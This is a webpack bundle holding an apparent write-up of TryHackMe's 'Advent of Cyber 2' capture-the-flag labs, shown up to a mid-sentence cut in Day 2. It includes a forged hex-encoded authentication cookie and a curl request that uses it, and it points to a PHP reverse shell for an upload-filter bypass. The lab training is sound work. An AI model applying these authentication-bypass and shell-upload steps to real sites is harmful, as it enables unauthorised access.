"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[390],{3905:(e,t,n)=>{n.d(t,{Zo:()=>d,kt:()=>m});var a=n(67294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function r(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,i=function(e,t){if(null==e)return{};var n,a,i={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):r(r({},t),e)),n},d=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},h="mdxType",c={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},u=a.forwardRef((function(e,t){var n=e.components,i=e.mdxType,o=e.originalType,s=e.parentName,d=l(e,["components","mdxType","originalType","parentName"]),h=p(n),u=i,m=h["".concat(s,".").concat(u)]||h[u]||c[u]||o;return n?a.createElement(m,r(r({ref:t},d),{},{components:n})):a.createElement(m,r({ref:t},d))}));function m(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var o=n.length,r=new Array(o);r[0]=u;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[h]="string"==typeof e?e:i,r[1]=l;for(var p=2;p<o;p++)r[p]=n[p];return a.createElement.apply(null,r)}return a.createElement.apply(null,n)}u.displayName="MDXCreateElement"},37726:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>r,default:()=>c,frontMatter:()=>o,metadata:()=>l,toc:()=>p});var a=n(87462),i=(n(67294),n(3905));const o={},r=void 0,l={unversionedId:"Tryhackme/Advent of Cyber 2/Advent of Cyber 2",id:"Tryhackme/Advent of Cyber 2/Advent of Cyber 2",title:"Advent of Cyber 2",description:"Event Homepage//tryhackme.com/christmas",source:"@site/writeups/Tryhackme/Advent of Cyber 2/Advent of Cyber 2.md",sourceDirName:"Tryhackme/Advent of Cyber 2",slug:"/Tryhackme/Advent of Cyber 2/",permalink:"/writeups/Tryhackme/Advent of Cyber 2/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Advent of Cyber",permalink:"/writeups/Tryhackme/Advent of Cyber/"},next:{title:"Adventure Time",permalink:"/writeups/Tryhackme/Adventure Time/"}},s={},p=[{value:"Checklist",id:"checklist",level:2},{value:"Day 1: A Christmas Crisis",id:"day-1-a-christmas-crisis",level:2},{value:"Basic enumeration",id:"basic-enumeration",level:3},{value:"What is the name of the the cookie used for authentication?",id:"what-is-the-name-of-the-the-cookie-used-for-authentication",level:3},{value:"What format is the value of this cookie encoded and what format is the data stored in?",id:"what-format-is-the-value-of-this-cookie-encoded-and-what-format-is-the-data-stored-in",level:3},{value:"Bypassing the authentication",id:"bypassing-the-authentication",level:3},{value:"Getting the flag",id:"getting-the-flag",level:3},{value:"Making a solve script",id:"making-a-solve-script",level:3},{value:"Day 2: The Elf Strikes Back",id:"day-2-the-elf-strikes-back",level:2},{value:"Basic enumeration",id:"basic-enumeration-1",level:3},{value:"What string of text needs added to the URL to get access to the upload page?",id:"what-string-of-text-needs-added-to-the-url-to-get-access-to-the-upload-page",level:3},{value:"What type of file is accepted by the site?",id:"what-type-of-file-is-accepted-by-the-site",level:3},{value:"In which directory are the uploaded files stored?",id:"in-which-directory-are-the-uploaded-files-stored",level:3},{value:"Getting a shell",id:"getting-a-shell",level:3},{value:"What is the flag in /var/www/flag.txt?",id:"what-is-the-flag-in-varwwwflagtxt",level:3},{value:"Day 3: Christmas Chaos",id:"day-3-christmas-chaos",level:2},{value:"Basic Enumeration",id:"basic-enumeration-2",level:3},{value:"Brute force attack",id:"brute-force-attack",level:3},{value:"Day 4: Santa&#39;s watching",id:"day-4-santas-watching",level:2},{value:"Given the URL <code>http://shibes.xyz/api.php</code>, what would the entire wfuzz command look like to query the &quot;breed&quot; parameter using the wordlist &quot;big.txt&quot; (assume that &quot;big.txt&quot; is in your current directory)",id:"given-the-url-httpshibesxyzapiphp-what-would-the-entire-wfuzz-command-look-like-to-query-the-breed-parameter-using-the-wordlist-bigtxt-assume-that-bigtxt-is-in-your-current-directory",level:3},{value:"Basic Enumeration",id:"basic-enumeration-3",level:3},{value:"Finding the API directory using Gobuster",id:"finding-the-api-directory-using-gobuster",level:3},{value:"Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?",id:"fuzz-the-date-parameter-on-the-file-you-found-in-the-api-directory-what-is-the-flag-displayed-in-the-correct-post",level:3},{value:"Getting the flag",id:"getting-the-flag-1",level:3},{value:"Day 5: Someone stole Santa&#39;s gift list!",id:"day-5-someone-stole-santas-gift-list",level:2},{value:"Without using directory brute forcing, what&#39;s Santa&#39;s secret login panel?",id:"without-using-directory-brute-forcing-whats-santas-secret-login-panel",level:3},{value:"Bypass the login using SQL injection",id:"bypass-the-login-using-sql-injection",level:3},{value:"How many entries are there in the gift database?",id:"how-many-entries-are-there-in-the-gift-database",level:3},{value:"Finding the flag",id:"finding-the-flag",level:3},{value:"Getting the admin password",id:"getting-the-admin-password",level:3},{value:"Day 6: Be careful with what you wish on a Christmas night",id:"day-6-be-careful-with-what-you-wish-on-a-christmas-night",level:2},{value:"Finding the cross-site scripting",id:"finding-the-cross-site-scripting",level:3},{value:"Stored cross-site scripting",id:"stored-cross-site-scripting",level:4},{value:"Reflected cross-site scripting",id:"reflected-cross-site-scripting",level:4},{value:"How to exploit?",id:"how-to-exploit",level:4},{value:"Getting the flag",id:"getting-the-flag-2",level:3},{value:"Day 7: The Grinch Really Did Steal Christmas",id:"day-7-the-grinch-really-did-steal-christmas",level:2},{value:"Unzipping",id:"unzipping",level:3},{value:"pcap1.pcap",id:"pcap1pcap",level:3},{value:"Open &quot;pcap1.pcap&quot; in Wireshark. What is the IP address that initiates an ICMP/ping?",id:"open-pcap1pcap-in-wireshark-what-is-the-ip-address-that-initiates-an-icmpping",level:4},{value:"Filtering to see HTTP GET requests",id:"filtering-to-see-http-get-requests",level:4},{value:"pcap2.pcap",id:"pcap2pcap",level:3},{value:"Find the password used for FTP",id:"find-the-password-used-for-ftp",level:4},{value:"What is the name of the protocol that is encrypted?",id:"what-is-the-name-of-the-protocol-that-is-encrypted",level:4},{value:"pcap3.pcap",id:"pcap3pcap",level:3},{value:"Day 8: What&#39;s Under the Christmas Tree?",id:"day-8-whats-under-the-christmas-tree",level:2},{value:"Running the Nmap scan",id:"running-the-nmap-scan",level:3},{value:"What ports are open?",id:"what-ports-are-open",level:3},{value:"What Linux Distribution is the box?",id:"what-linux-distribution-is-the-box",level:3},{value:"What is the &quot;HTTP-TITLE&quot; for the webserver",id:"what-is-the-http-title-for-the-webserver",level:3},{value:"Day 9: Anyone can be Santa!",id:"day-9-anyone-can-be-santa",level:2},{value:"Connecting to the FTP server and basic enumeration",id:"connecting-to-the-ftp-server-and-basic-enumeration",level:3},{value:"shoppinglist.txt",id:"shoppinglisttxt",level:3},{value:"backup.sh",id:"backupsh",level:3},{value:"Becoming root and getting the flag!",id:"becoming-root-and-getting-the-flag",level:3},{value:"Day 10: Don&#39;t be Elfish!",id:"day-10-dont-be-elfish",level:2},{value:"Getting Enum4Linux",id:"getting-enum4linux",level:3},{value:"Basic Enumeration",id:"basic-enumeration-4",level:3},{value:"Connecting to the Samba server",id:"connecting-to-the-samba-server",level:3},{value:"Day 11: The Rogue Gnome",id:"day-11-the-rogue-gnome",level:2},{value:"Basic Questions",id:"basic-questions",level:3},{value:"What type of privilege escalation involves using a user account to execute commands as an administrator?",id:"what-type-of-privilege-escalation-involves-using-a-user-account-to-execute-commands-as-an-administrator",level:4},{value:"What is the name of the file that contains a list of users who are a part of the sudo group?",id:"what-is-the-name-of-the-file-that-contains-a-list-of-users-who-are-a-part-of-the-sudo-group",level:4},{value:"Connecting via SSH",id:"connecting-via-ssh",level:3},{value:"Privilege Escalation",id:"privilege-escalation",level:3},{value:"Getting the flag",id:"getting-the-flag-3",level:3},{value:"Day 12: Ready, set, elf!",id:"day-12-ready-set-elf",level:2},{value:"Vulnerability Knowledge Bases",id:"vulnerability-knowledge-bases",level:3},{value:"Basic enumeration",id:"basic-enumeration-5",level:3},{value:"What is the version number of the web server?",id:"what-is-the-version-number-of-the-web-server",level:3},{value:"Finding the vulnerability using searchsploit",id:"finding-the-vulnerability-using-searchsploit",level:3},{value:"Running the exploit using Metasploit",id:"running-the-exploit-using-metasploit",level:3},{value:"Getting the flag",id:"getting-the-flag-4",level:3},{value:"Privilege Escalation",id:"privilege-escalation-1",level:3},{value:"Day 13: Coal for Christmas",id:"day-13-coal-for-christmas",level:2},{value:"Basic enumeration",id:"basic-enumeration-6",level:3},{value:"What old, deprecated protocol and service is running?",id:"what-old-deprecated-protocol-and-service-is-running",level:4},{value:"Getting a shell",id:"getting-a-shell-1",level:3},{value:"More enumeration",id:"more-enumeration",level:3},{value:"Poking around the filesystem",id:"poking-around-the-filesystem",level:3},{value:"DirtyCOW (CVE-2016-5195)",id:"dirtycow-cve-2016-5195",level:3},{value:"Getting the flag",id:"getting-the-flag-5",level:3},{value:"Day 14: Where&#39;s Rudolph",id:"day-14-wheres-rudolph",level:2},{value:"Reddit",id:"reddit",level:3},{value:"Twitter",id:"twitter",level:3},{value:"Photo EXIF Data",id:"photo-exif-data",level:3},{value:"Finding Rudolph&#39;s Password",id:"finding-rudolphs-password",level:3},{value:"Finding Rudolph&#39;s location",id:"finding-rudolphs-location",level:3},{value:"Day 15: There&#39;s a Python in my stocking!",id:"day-15-theres-a-python-in-my-stocking",level:2},{value:"What&#39;s the output of <code>True + True</code>?",id:"whats-the-output-of-true--true",level:3},{value:"What&#39;s the database for installing other peoples libraries called?",id:"whats-the-database-for-installing-other-peoples-libraries-called",level:3},{value:"What is the output of bool(&quot;False&quot;)?",id:"what-is-the-output-of-boolfalse",level:3},{value:"What library lets us download the HTML of a webpage?",id:"what-library-lets-us-download-the-html-of-a-webpage",level:3},{value:"What is the output of the program provided in &quot;Code to analyse for Question 5&quot; in today&#39;s material?",id:"what-is-the-output-of-the-program-provided-in-code-to-analyse-for-question-5-in-todays-material",level:3},{value:"What causes the previous task to output that?",id:"what-causes-the-previous-task-to-output-that",level:4},{value:"Day 16: Help! Where is Santa?",id:"day-16-help-where-is-santa",level:2},{value:"Basic enumeration",id:"basic-enumeration-7",level:3},{value:"Visiting the webpage",id:"visiting-the-webpage",level:3},{value:"Finding Santa&#39;s Location",id:"finding-santas-location",level:3},{value:"Finding the API endpoint",id:"finding-the-api-endpoint",level:3},{value:"Finding Santa&#39;s Location",id:"finding-santas-location-1",level:3},{value:"Day 17: ReverseELFneering",id:"day-17-reverseelfneering",level:2},{value:"Getting started",id:"getting-started",level:3},{value:"Practicing with file1",id:"practicing-with-file1",level:3},{value:"Moving on to challenge1",id:"moving-on-to-challenge1",level:3},{value:"What is the value of local_ch when its corresponding movl instruction is called (first if multiple)?",id:"what-is-the-value-of-local_ch-when-its-corresponding-movl-instruction-is-called-first-if-multiple",level:4},{value:"What is the value of eax when the imull instruction is called?",id:"what-is-the-value-of-eax-when-the-imull-instruction-is-called",level:4},{value:"What is the value of local_4h before eax is set to 0?",id:"what-is-the-value-of-local_4h-before-eax-is-set-to-0",level:4},{value:"Side note",id:"side-note",level:3},{value:"Day 18: The Bits of the Christmas",id:"day-18-the-bits-of-the-christmas",level:2},{value:"Connecting to the Windows Machine using RDP",id:"connecting-to-the-windows-machine-using-rdp",level:3},{value:"Getting Santa&#39;s password and the flag!",id:"getting-santas-password-and-the-flag",level:3},{value:"Although technically the flag&#39;s in the previous screenshot...",id:"although-technically-the-flags-in-the-previous-screenshot",level:3},{value:"Day 19: The Naughty or Nice List",id:"day-19-the-naughty-or-nice-list",level:2},{value:"Finding the vulnerability",id:"finding-the-vulnerability",level:3},{value:"Getting the flag",id:"getting-the-flag-6",level:3},{value:"Day 20: PowershELlF to the rescue",id:"day-20-powershellf-to-the-rescue",level:2},{value:"Connecting via SSH",id:"connecting-via-ssh-1",level:3},{value:"Getting started in PowerShell",id:"getting-started-in-powershell",level:3},{value:"Search for the first hidden elf file within the Documents folder. Read the contents of this file. What does Elf 1 want?",id:"search-for-the-first-hidden-elf-file-within-the-documents-folder-read-the-contents-of-this-file-what-does-elf-1-want",level:3},{value:"Search on the desktop for a hidden folder that contains the file for Elf 2. Read the contents of this file. What is the name of that movie that Elf 2 wants?",id:"search-on-the-desktop-for-a-hidden-folder-that-contains-the-file-for-elf-2-read-the-contents-of-this-file-what-is-the-name-of-that-movie-that-elf-2-wants",level:3},{value:"Search the Windows directory for a hidden folder that contains files for Elf 3. What is the name of the hidden folder?",id:"search-the-windows-directory-for-a-hidden-folder-that-contains-files-for-elf-3-what-is-the-name-of-the-hidden-folder",level:3},{value:"How many words does the first file contain?",id:"how-many-words-does-the-first-file-contain",level:3},{value:"What 2 words are at index 551 and 6991 in the first file?",id:"what-2-words-are-at-index-551-and-6991-in-the-first-file",level:3},{value:"Search in the 2nd file for the phrase from the previous question to get the full answer. What does Elf 3 want?",id:"search-in-the-2nd-file-for-the-phrase-from-the-previous-question-to-get-the-full-answer-what-does-elf-3-want",level:3},{value:"Day 21: Time for some ELForensics",id:"day-21-time-for-some-elforensics",level:2},{value:"Connecting via RDP",id:"connecting-via-rdp",level:3},{value:"Getting started",id:"getting-started-1",level:3},{value:"Contents of the &quot;<code>db file hash.txt</code>&quot; file.",id:"contents-of-the-db-file-hashtxt-file",level:3},{value:"Getting the hash of <code>deebee.exe</code>",id:"getting-the-hash-of-deebeeexe",level:3},{value:"Getting the flag!",id:"getting-the-flag-7",level:3},{value:"Running the real database connector and getting another flag!",id:"running-the-real-database-connector-and-getting-another-flag",level:3},{value:"Day 22: Elf McEager becomes CyberElf",id:"day-22-elf-mceager-becomes-cyberelf",level:2},{value:"Logging in",id:"logging-in",level:3},{value:"Opening keypass",id:"opening-keypass",level:3},{value:"Getting the passwords",id:"getting-the-passwords",level:3},{value:"Getting the flag",id:"getting-the-flag-8",level:3},{value:"Day 23: The Grinch strikes again",id:"day-23-the-grinch-strikes-again",level:2},{value:"Connecting via RDP",id:"connecting-via-rdp-1",level:3},{value:"Reading the ransomnote",id:"reading-the-ransomnote",level:3},{value:"Looking at the encrypted files",id:"looking-at-the-encrypted-files",level:3},{value:"Looking through the scheduled tasks",id:"looking-through-the-scheduled-tasks",level:3},{value:"Looking for a VSS scheduled task",id:"looking-for-a-vss-scheduled-task",level:3},{value:"Day 24: The Trial Before Christmas",id:"day-24-the-trial-before-christmas",level:2},{value:"Basic Enumeration",id:"basic-enumeration-8",level:3},{value:"What is the title of the webpages",id:"what-is-the-title-of-the-webpages",level:3},{value:"Gobuster",id:"gobuster",level:3},{value:"Evading the upload filter",id:"evading-the-upload-filter",level:3},{value:"Getting web flag: <code>web.txt</code>",id:"getting-web-flag-webtxt",level:3},{value:"Spawning a stable shell using Python",id:"spawning-a-stable-shell-using-python",level:3},{value:"Poking through the filesystem",id:"poking-through-the-filesystem",level:3},{value:"Accessing the database",id:"accessing-the-database",level:3},{value:"Cracking the password hash",id:"cracking-the-password-hash",level:3},{value:"Becoming Flynn",id:"becoming-flynn",level:3},{value:"Getting user flag: <code>user.txt</code>",id:"getting-user-flag-usertxt",level:3},{value:"Privilege Escalation",id:"privilege-escalation-2",level:3},{value:"Getting root flag: <code>root.txt</code>",id:"getting-root-flag-roottxt",level:3}],d={toc:p},h="wrapper";function c(e){let{components:t,...o}=e;return(0,i.kt)(h,(0,a.Z)({},d,o,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("p",null,"#Advent of Cyber 2"),(0,i.kt)("p",null,"Event Homepage: ",(0,i.kt)("a",{parentName:"p",href:"https://tryhackme.com/christmas"},(0,i.kt)("inlineCode",{parentName:"a"},"https://tryhackme.com/christmas"))),(0,i.kt)("h2",{id:"checklist"},"Checklist"),(0,i.kt)("ul",{className:"contains-task-list"},(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-1-a-christmas-crisis"},"Day 1 - A Christmas Crisis")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-2-the-elf-strikes-back"},"Day 2 - The Elf Strikes Back")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-3-christmas-chaos"},"Day 3 - Christmas Chaos")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-4-santas-watching"},"Day 4 - Santa's watching")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-5-someone-stole-santas-gift-list"},"Day 5 - Someone stole Santa's gift list!")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-6-be-careful-with-what-you-wish-on-a-christmas-night"},"Day 6 - Be careful with what you wish on a Christmas night")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-7-the-grinch-really-did-steal-christmas"},"Day 7 - The Grinch Really Did Steal Christmas")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-8-whats-under-the-christmas-tree"},"Day 8 - What's Under the Christmas Tree?")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-9-anyone-can-be-santa"},"Day 9 - Anyone can be Santa!")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-10-dont-be-elfish"},"Day 10 - Don't be Elfish!")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-11-the-rogue-gnome"},"Day 11 - The Rogue Gnome")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-12-ready-set-elf"},"Day 12 - Ready, set, elf.")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-13-coal-for-christmas"},"Day 13 - Coal for Christmas")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-14-wheres-rudolph"},"Day 14 - Where's Rudolph?")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-15-theres-a-python-in-my-stocking"},"Day 15 - There's a Python in my stocking!")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-16-help-where-is-santa"},"Day 16 - Help! Where is Santa?")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-17-reverse-elfneering"},"Day 17 - ReverseELFneering")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-18-the-bits-of-the-christmas"},"Day 18 - The Bits of the Christmas")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-19-the-naughty-or-nice-list"},"Day 19 - The Naughty or Nice List")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-20-powershellf-to-the-rescue"},"Day 20 - PowershELlF to the rescue")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#day-21-time-for-some-elforensics"},"Day 21 - Time for some ELForensics")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#Day-22-Elf-McEager-becomes-CyberElf"},"Day 22 - Elf McEager becomes CyberElf")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#Day-23-The-Grinch-strikes-again"},"Day 23 - The Grinch strikes again!")),(0,i.kt)("li",{parentName:"ul",className:"task-list-item"},(0,i.kt)("input",{parentName:"li",type:"checkbox",checked:!0,disabled:!0})," ",(0,i.kt)("a",{parentName:"li",href:"#Day-24-The-Trial-Before-Christmas"},"Day 24 - The Trial Before Christmas"))),(0,i.kt)("h2",{id:"day-1-a-christmas-crisis"},"Day 1: A Christmas Crisis"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Web Exploitation"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: HTTP, Cookies"),"  "),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Understand how the web works and take back control of the Christmas Command Centre!")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.161.100")),(0,i.kt)("h3",{id:"basic-enumeration"},"Basic enumeration"),(0,i.kt)("p",null,"Firstly, I checked out the web server running on port 80 (HTTP)."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(80222).Z,width:"1845",height:"844"})),(0,i.kt)("p",null,"I register for an account using the credentials ",(0,i.kt)("inlineCode",{parentName:"p"},"admin:bluemoon")," and then log in with those credentials."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(69543).Z,width:"1846",height:"844"})),(0,i.kt)("h3",{id:"what-is-the-name-of-the-the-cookie-used-for-authentication"},"What is the name of the the cookie used for authentication?"),(0,i.kt)("p",null,"The name of the authentication cookie is: ",(0,i.kt)("inlineCode",{parentName:"p"},"auth"),"."),(0,i.kt)("h3",{id:"what-format-is-the-value-of-this-cookie-encoded-and-what-format-is-the-data-stored-in"},"What format is the value of this cookie encoded and what format is the data stored in?"),(0,i.kt)("p",null,"The value of the auth cookie is: ",(0,i.kt)("inlineCode",{parentName:"p"},"7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2261646d696e227d"),".  "),(0,i.kt)("p",null,"Putting the entire thing into ",(0,i.kt)("a",{parentName:"p",href:"https://gchq.github.io/CyberChef/"},"CyberChef"),", we find that it is using ",(0,i.kt)("inlineCode",{parentName:"p"},"hexadecimal")," to encode the string: ",(0,i.kt)("inlineCode",{parentName:"p"},'{"company":"The Best Festival Company", "username":"admin"}'),".  "),(0,i.kt)("p",null,"The data is stored in ",(0,i.kt)("inlineCode",{parentName:"p"},"JSON")," format.  "),(0,i.kt)("h3",{id:"bypassing-the-authentication"},"Bypassing the authentication"),(0,i.kt)("p",null,"We can encode ",(0,i.kt)("inlineCode",{parentName:"p"},'{"company":"The Best Festival Company", "username":"santa"}')," into hexadecimal to find the value of santa's authentication token.  "),(0,i.kt)("p",null,"Value of the santa cookie: ",(0,i.kt)("inlineCode",{parentName:"p"},"7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d"),".  "),(0,i.kt)("p",null,"After setting the auth cookie to that string, we get access to the santa account and full control panel access."),(0,i.kt)("h3",{id:"getting-the-flag"},"Getting the flag"),(0,i.kt)("p",null,"I'm not sure why but I got a bit stuck here. Turns out, you just flick all the switches and you get the final flag."),(0,i.kt)("p",null,"Flag: ",(0,i.kt)("inlineCode",{parentName:"p"},"THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}")),(0,i.kt)("h3",{id:"making-a-solve-script"},"Making a ",(0,i.kt)("a",{target:"_blank",href:n(84561).Z},"solve script")),(0,i.kt)("p",null,"I noticed that the program sends a post request to ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.161.100/api/checkflag"),". I noticed it also sent the cookie along with it. Therefore, I decided to send a POST request to the URL with the cookie and lo and behold, the flag! Here, I did it using curl in bash:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},'curl -X POST -H "Cookie: auth=7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d" http://10.10.161.100/api/checkflag;\n')),(0,i.kt)("p",null,"I have also included the shell script I wrote in the day01-christmas-crisis directory. "),(0,i.kt)("h2",{id:"day-2-the-elf-strikes-back"},"Day 2: The Elf Strikes Back"),(0,i.kt)("p",null,(0,i.kt)("em",{parentName:"p"},"Category: Web"),(0,i.kt)("br",{parentName:"p"}),"\n",(0,i.kt)("em",{parentName:"p"},"Tags: RCE"),"  "),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Learn about basic file upload filter bypasses by performing a security audit on the new security management server!")),(0,i.kt)("p",null,"IP: ",(0,i.kt)("inlineCode",{parentName:"p"},"10.10.119.58")),(0,i.kt)("h3",{id:"basic-enumeration-1"},"Basic enumeration"),(0,i.kt)("p",null,"Firstly, I checked the HTTP server running on port 80."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(71856).Z,width:"1524",height:"705"})),(0,i.kt)("h3",{id:"what-string-of-text-needs-added-to-the-url-to-get-access-to-the-upload-page"},"What string of text needs added to the URL to get access to the upload page?"),(0,i.kt)("p",null,"We can use the id given to us (",(0,i.kt)("inlineCode",{parentName:"p"},"ODIzODI5MTNiYmYw"),") to find an upload page at ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.119.58/?id=ODIzODI5MTNiYmYw"),"."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(78652).Z,width:"1515",height:"707"})),(0,i.kt)("h3",{id:"what-type-of-file-is-accepted-by-the-site"},"What type of file is accepted by the site?"),(0,i.kt)("p",null,"If we examine the source code, we find the following the the HTML code:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-HTML"},'<input type=file id="chooseFile" accept=".jpeg,.jpg,.png">\n')),(0,i.kt)("p",null,"It turns out that this page only accepts image files."),(0,i.kt)("h3",{id:"in-which-directory-are-the-uploaded-files-stored"},"In which directory are the uploaded files stored?"),(0,i.kt)("p",null,"After poking around in the address bar, I found that the uploads are kept in the ",(0,i.kt)("inlineCode",{parentName:"p"},"/uploads/")," directory.  "),(0,i.kt)("p",null,"We can find the uploaded files at ",(0,i.kt)("inlineCode",{parentName:"p"},"http://10.10.119.58/uploads/"),"."),(0,i.kt)("h3",{id:"getting-a-shell"},"Getting a shell"),(0,i.kt)("p",null,"Firstly, I wanted to find out what was running the web server. Therefore, I opened the network tab and reloaded the page to get the response headers."),(0,i.kt)("p",null,(0,i.kt)("img",{alt:"screenshot",src:n(46492).Z,width:"1529",height:"351"})),(0,i.kt)("p",null,"We see that the server is running Apache 2.4.37 on CentOS powered by PHP. Therefore, I got a PHP reverse shell script from ",(0,i.kt)("a",{parentName:"p",href:"https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"},"Pentest Monkey"),".  "),(0,i.kt)("p",null,"Be sure to 